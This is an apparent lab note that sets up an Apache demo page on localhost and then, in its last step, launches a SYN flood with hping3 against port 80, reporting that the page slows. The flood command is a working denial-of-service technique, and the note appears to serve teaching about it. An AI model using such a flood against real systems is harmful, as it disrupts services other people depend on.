Step 1 : Starting Apache = sudo systemctl start apache2 , sudo systemctl enable apache2

Step 2 : Hosting a Demo Site :

        sudo nano /var/www/html/demo.html

        Demo Site Code :

        <!DOCTYPE html>
<html>
<head>
    <title>Demo Static Site</title>
</head>
<body>
    <h1>Welcome to My Website</h1>
    <p>This is a demo site for testing.</p>
</body>
</html>

Step 3 : lauching the demo site : firefox http://localhost

Step 4 : Lauching DDOS : sudo hping3 -S --flood -V -p 80 eth0

In resultant, the WebPage becomes slow and showing slow resonse.

 


